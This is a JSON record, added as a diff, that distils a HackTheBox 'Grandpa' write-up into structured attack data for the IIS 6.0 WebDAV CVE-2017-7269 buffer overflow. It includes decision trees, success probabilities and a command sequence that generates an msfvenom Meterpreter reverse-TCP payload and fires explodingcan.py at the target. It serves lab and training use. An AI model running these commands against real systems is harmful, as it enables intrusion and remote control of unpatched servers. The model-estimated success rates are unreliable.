@@ -1,0 +1,719 @@
+{
+  "writeup_id": "Htb_Grandpa",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_iis6_webdav_buffer_overflow",
+    "primary_services": [
+      "http",
+      "webdav"
+    ],
+    "port_signature": "80",
+    "service_combination": "iis6+webdav",
+    "os_family": "windows_legacy",
+    "environment_type": "standalone_web_server",
+    "entry_vector": "webdav_buffer_overflow",
+    "privilege_path": "network_service_to_system",
+    "attack_complexity": "easy",
+    "estimated_time": "15-30 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "iis_6.0_version",
+      "webdav_enabled",
+      "scstoragepathfromurl_vulnerability",
+      "windows_xp_server2003"
+    ],
+    "environmental_clues": [
+      "under_construction_page",
+      "webdav_methods_enabled",
+      "legacy_windows_system",
+      "single_http_port"
+    ],
+    "similar_scenarios": [
+      "granny_htb_easy",
+      "legacy_iis_targets"
+    ],
+    "unique_aspects": [
+      "webdav_put_disabled",
+      "minimal_attack_surface",
+      "oscp_style_target"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "IIS_6.0_WebDAV_Buffer_Overflow",
+        "success_reason": "Legacy IIS 6.0 server with unpatched CVE-2017-7269 vulnerability",
+        "prerequisite_indicators": [
+          "iis_6.0_version_detected",
+          "webdav_enabled",
+          "windows_server_2003_or_xp",
+          "unpatched_system"
+        ],
+        "recognition_patterns": [
+          "Microsoft-IIS/6.0 in server headers",
+          "WebDAV methods in OPTIONS response",
+          "Windows Server 2003/XP timeframe",
+          "ScStoragePathFromUrl vulnerability present"
+        ],
+        "failure_modes": [
+          "system_patched_for_cve_2017_7269",
+          "webdav_disabled",
+          "modern_iis_version",
+          "exploit_mitigation_enabled"
+        ],
+        "environmental_factors": [
+          "legacy_windows_system",
+          "default_iis_configuration",
+          "no_security_updates",
+          "webdav_service_running"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-30 minutes"
+      },
+      {
+        "technique": "Version_Based_Exploit_Selection",
+        "success_reason": "Accurate version fingerprinting led to correct vulnerability identification",
+        "prerequisite_indicators": [
+          "service_version_enumeration",
+          "searchsploit_database_available",
+          "cve_database_access"
+        ],
+        "recognition_patterns": [
+          "specific version in nmap output",
+          "matching exploits in searchsploit",
+          "known CVE for exact version",
+          "public exploit code available"
+        ],
+        "failure_modes": [
+          "version_obfuscation",
+          "custom_patches_applied",
+          "exploit_code_outdated",
+          "architecture_mismatch"
+        ],
+        "environmental_factors": [
+          "legacy_system_maintenance",
+          "default_server_headers",
+          "no_version_hiding",
+          "standard_installation"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "IIS 6.0 with WebDAV enabled",
+        "discovery_method": "nmap service detection and script scanning",
+        "why_critical": "Identified vulnerable service with known RCE exploit",
+        "how_to_recognize": [
+          "Microsoft-IIS/6.0 in server header",
+          "WebDAV methods in nmap http-webdav-scan",
+          "Windows Server 2003/XP indicators",
+          "Multiple WebDAV HTTP methods allowed"
+        ],
+        "follow_up_actions": [
+          "search_for_iis_6_exploits",
+          "verify_webdav_functionality",
+          "test_cve_2017_7269_exploit",
+          "prepare_reverse_shell_payload"
+        ]
+      },
+      {
+        "discovery": "CVE-2017-7269 ScStoragePathFromUrl vulnerability",
+        "discovery_method": "searchsploit and CVE database research",
+        "why_critical": "Direct path to remote code execution on legacy system",
+        "how_to_recognize": [
+          "IIS 6.0 version confirmation",
+          "WebDAV enabled service",
+          "Exploit available in searchsploit",
+          "Buffer overflow in WebDAV parsing"
+        ],
+        "follow_up_actions": [
+          "download_exploit_code",
+          "modify_shellcode_payload",
+          "test_exploit_reliability",
+          "establish_reverse_shell"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "network_service",
+        "escalation_method": "Windows_Token_Impersonation",
+        "why_possible": "Legacy Windows system with weak privilege separation",
+        "recognition_signs": [
+          "windows_server_2003_system",
+          "iis_service_account_context",
+          "seimpersonate_privilege_available",
+          "token_kidnapping_possible"
+        ],
+        "exploitation_path": "IIS Exploit → Network Service → Token Impersonation → SYSTEM"
+      },
+      {
+        "privilege_level": "initial_foothold",
+        "escalation_method": "Legacy_System_Kernel_Exploits",
+        "why_possible": "Unpatched Windows Server 2003 system vulnerable to local privilege escalation",
+        "recognition_signs": [
+          "windows_server_2003_version",
+          "missing_security_patches",
+          "kernel_exploit_compatibility",
+          "no_modern_exploit_mitigations"
+        ],
+        "exploitation_path": "WebDAV RCE → Shell Upload → Kernel Exploit → SYSTEM"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only port 80 open running Microsoft IIS 6.0",
+        "decision": "Identify legacy IIS version and search for known vulnerabilities",
+        "reasoning": "IIS 6.0 indicates Windows XP/Server 2003 with known critical vulnerabilities",
+        "confidence": 0.95,
+        "alternatives": [
+          {
+            "option": "directory_enumeration",
+            "when": "if no immediate exploits found"
+          },
+          {
+            "option": "webdav_testing",
+            "when": "if webdav methods detected"
+          }
+        ],
+        "success_indicators": [
+          "iis_version_confirmed",
+          "webdav_methods_available",
+          "legacy_os_identified"
+        ],
+        "next_decision": "select_vulnerability_exploit"
+      },
+      {
+        "step": 2,
+        "situation": "WebDAV methods detected in nmap scan with risky methods available",
+        "decision": "Test WebDAV functionality and search for WebDAV-specific exploits",
+        "reasoning": "WebDAV on IIS 6.0 has known buffer overflow vulnerabilities",
+        "confidence": 0.9,
+        "prerequisites": [
+          "webdav_methods_confirmed",
+          "iis_6_version_confirmed"
+        ],
+        "success_indicators": [
+          "webdav_responds",
+          "propfind_method_works"
+        ],
+        "failure_fallbacks": [
+          "directory_brute_force",
+          "file_upload_testing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Confirmed IIS 6.0 with WebDAV, found CVE-2017-7269 buffer overflow",
+        "decision": "Use WebDAV ScStoragePathFromUrl buffer overflow exploit",
+        "reasoning": "Known RCE vulnerability with public exploits available",
+        "confidence": 0.85,
+        "prerequisites": [
+          "webdav_accessible",
+          "target_responds_to_propfind"
+        ],
+        "success_indicators": [
+          "exploit_executes",
+          "reverse_shell_received"
+        ],
+        "failure_fallbacks": [
+          "modify_shellcode",
+          "try_metasploit_version"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_webdav_exploit_succeeds": {
+        "action": "establish_persistent_shell",
+        "tools": [
+          "nc",
+          "custom_shellcode"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_webdav_exploit_fails": {
+        "action": "modify_exploit_parameters",
+        "alternatives": [
+          "adjust_shellcode",
+          "try_different_payload",
+          "use_metasploit"
+        ],
+        "decision_criteria": "based_on_error_response_analysis"
+      },
+      "if_initial_shell_obtained": {
+        "action": "enumerate_system_for_privesc",
+        "purpose": "find_local_privilege_escalation",
+        "tools": [
+          "systeminfo",
+          "whoami",
+          "net_user"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_iis_version_for_legacy_vulnerabilities",
+        "reasoning": "legacy_iis_versions_have_well_documented_rce_exploits",
+        "applicability": "windows_iis_web_servers"
+      },
+      {
+        "rule": "prioritize_webdav_testing_on_iis_6",
+        "reasoning": "webdav_buffer_overflow_is_reliable_attack_vector",
+        "applicability": "iis_6_with_webdav_methods_enabled"
+      },
+      {
+        "rule": "prepare_custom_shellcode_for_legacy_exploits",
+        "reasoning": "default_exploit_shellcode_often_needs_modification",
+        "applicability": "legacy_windows_targets"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "IIS_WebDAV_Buffer_Overflow",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "webdav"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "iis_6.0_detected",
+          "webdav_enabled",
+          "vulnerable_scstoragepathhfromurl_function"
+        ],
+        "success_indicators": [
+          "webdav_methods_available",
+          "propfind_method_allowed",
+          "iis_6.0_banner_detected"
+        ],
+        "incompatible_with": [
+          "iis_patched",
+          "webdav_disabled",
+          "modern_iis_version"
+        ],
+        "confidence_boosters": [
+          "windows_xp_or_2003_detected",
+          "multiple_webdav_methods_enabled",
+          "legacy_system_indicators"
+        ],
+        "typical_success_rate": 0.92,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Directory_Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_server_accessible",
+          "directory_listing_disabled"
+        ],
+        "success_indicators": [
+          "hidden_directories_found",
+          "status_codes_200_301_403",
+          "interesting_paths_discovered"
+        ],
+        "incompatible_with": [
+          "rate_limiting_aggressive",
+          "waf_blocking_requests"
+        ],
+        "confidence_boosters": [
+          "common_cms_patterns",
+          "default_installations",
+          "legacy_web_applications"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "iis_webdav": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "webdav"
+        ],
+        "banner_indicators": [
+          "Microsoft-IIS/6.0",
+          "WebDAV"
+        ],
+        "method_indicators": [
+          "PROPFIND",
+          "PROPPATCH",
+          "MKCOL",
+          "COPY",
+          "MOVE"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "legacy_windows": {
+        "port_indicators": [
+          80,
+          135,
+          139,
+          445
+        ],
+        "service_indicators": [
+          "http",
+          "netbios",
+          "smb"
+        ],
+        "banner_indicators": [
+          "Windows XP",
+          "Windows Server 2003",
+          "IIS/6.0"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "iis_webdav_buffer_overflow",
+          "when": "iis_6.0_webdav_detected",
+          "reason": "known_rce_high_success_rate"
+        },
+        {
+          "attack": "webdav_method_enumeration",
+          "when": "webdav_service_detected",
+          "reason": "often_reveals_upload_capabilities"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reliable_but_time_consuming"
+        },
+        {
+          "attack": "version_specific_exploits",
+          "when": "legacy_software_detected",
+          "reason": "older_systems_often_unpatched"
+        }
+      ],
+      "low_priority": [
+        {
+          "attack": "davtest_upload_attempts",
+          "when": "webdav_detected_but_restricted",
+          "reason": "low_success_when_methods_disabled"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "IIS 6.0 WebDAV Buffer Overflow",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "exploitation",
+        "tools_used": [
+          {
+            "name": "searchsploit",
+            "command_template": "searchsploit {service} {version}",
+            "actual_command": "searchsploit iis 6.0",
+            "output_pattern": "Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "explodingcan.py",
+            "command_template": "python explodingcan.py {target_url} {shellcode_file}",
+            "actual_command": "python explodingcan.py http://10.10.10.14 shellcode_msf_10.10.14.47_443",
+            "success_factors": [
+              "meterpreter_payload",
+              "alpha_mixed_encoding"
+            ],
+            "effectiveness_rating": 4
+          },
+          {
+            "name": "msfvenom",
+            "command_template": "msfvenom -p {payload} -f raw -e {encoder} LHOST={ip} LPORT={port} > {output}",
+            "actual_command": "msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > shellcode_msf_10.10.14.47_443",
+            "success_factors": [
+              "meterpreter_payload_stability",
+              "alpha_mixed_encoding"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "iis_6.0_webdav_enabled",
+          "target_windows_xp_2003",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "meterpreter_session_established",
+          "network_service_privileges_obtained",
+          "stable_shell_connection"
+        ],
+        "common_failures": [
+          "standard_shell_payloads_die_immediately",
+          "encoding_compatibility_issues",
+          "payload_size_restrictions"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "system_enumeration",
+          "token_impersonation"
+        ],
+        "time_investment": "10-30 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Service Version Enumeration",
+        "mitre_id": "T1046",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "nmap",
+            "command_template": "nmap -p {port} -sC -sV -oA {output} {target}",
+            "actual_command": "nmap -p 80 -sC -sV -oA scans/nmap-tcpscipts 10.10.10.14",
+            "output_pattern": "Microsoft IIS httpd 6.0",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "davtest",
+            "command_template": "davtest -url {target_url}",
+            "actual_command": "davtest -url http://10.10.10.14",
+            "success_factors": [
+              "webdav_enabled",
+              "write_permissions"
+            ],
+            "effectiveness_rating": 3
+          }
+        ],
+        "prerequisites": [
+          "target_accessible",
+          "http_service_running"
+        ],
+        "success_indicators": [
+          "service_version_identified",
+          "webdav_capabilities_enumerated",
+          "potential_vulnerabilities_identified"
+        ],
+        "common_failures": [
+          "service_detection_blocked",
+          "version_obfuscation"
+        ],
+        "follow_up_techniques": [
+          "vulnerability_research",
+          "exploit_development",
+          "directory_enumeration"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "explodingcan.py",
+        "use_case": "iis_6_webdav_exploitation",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "legacy_iis_targets"
+        ],
+        "alternatives": [
+          "metasploit_module",
+          "manual_exploit_modification"
+        ],
+        "best_practices": [
+          "use_meterpreter_payloads_for_stability",
+          "apply_alpha_mixed_encoding",
+          "test_payload_compatibility_first"
+        ]
+      },
+      {
+        "tool": "msfvenom",
+        "use_case": "shellcode_generation_legacy_systems",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "exploit_development",
+          "payload_customization"
+        ],
+        "alternatives": [
+          "manual_shellcode_writing",
+          "other_payload_generators"
+        ],
+        "best_practices": [
+          "use_staged_payloads_for_size_constraints",
+          "apply_appropriate_encoding_for_target",
+          "test_payload_before_deployment"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "iis6_webdav_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -p 80 -sC -sV 10.10.10.14",
+            "purpose": "Identify IIS version and WebDAV capabilities",
+            "expected_output": "Microsoft IIS httpd 6.0 with WebDAV methods"
+          },
+          {
+            "step": 2,
+            "command": "searchsploit iis 6.0",
+            "purpose": "Find available exploits for target version",
+            "expected_output": "WebDAV buffer overflow exploit available"
+          },
+          {
+            "step": 3,
+            "command": "msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/alpha_mixed LHOST=10.10.14.47 LPORT=443 > shellcode_msf",
+            "purpose": "Generate stable encoded payload",
+            "expected_output": "744 byte encoded payload"
+          },
+          {
+            "step": 4,
+            "command": "python explodingcan.py http://10.10.10.14 shellcode_msf",
+            "purpose": "Execute buffer overflow exploit",
+            "expected_output": "Meterpreter session as NETWORK SERVICE"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Grandpa",
+      "difficulty": "Easy",
+      "os": "Windows Server 2003/XP",
+      "platform": "HackTheBox",
+      "release_date": "2017-04-12",
+      "author": "ch4p",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "buffer_overflow"
+      ],
+      "key_vulnerabilities": [
+        "iis_6.0_webdav",
+        "windows_privilege_escalation"
+      ],
+      "environment_type": "legacy_web_server",
+      "real_world_relevance": "medium",
+      "learning_value": [
+        "legacy_system_exploitation",
+        "manual_exploitation",
+        "file_transfer_techniques"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_exploitation",
+        "windows_fundamentals",
+        "buffer_overflow_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "legacy_systems",
+        "privilege_escalation",
+        "buffer_overflow"
+      ],
+      "attack_types": [
+        "remote_code_execution",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "disable_unnecessary_services",
+        "system_hardening"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Granny",
+        "Devel",
+        "Legacy"
+      ],
+      "similarity_reasons": [
+        "legacy_windows",
+        "iis_exploitation",
+        "oscp_style"
+      ],
+      "unique_aspects": [
+        "webdav_exploitation",
+        "manual_exploit_development",
+        "file_transfer_challenges"
+      ],
+      "difficulty_factors": [
+        "straightforward_exploit_path",
+        "well_known_vulnerabilities",
+        "oscp_preparation"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T00:09:35.322257",
+    "original_file": "0xdf_writeups/Htb Grandpa.md",
+    "content_length": 34698,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
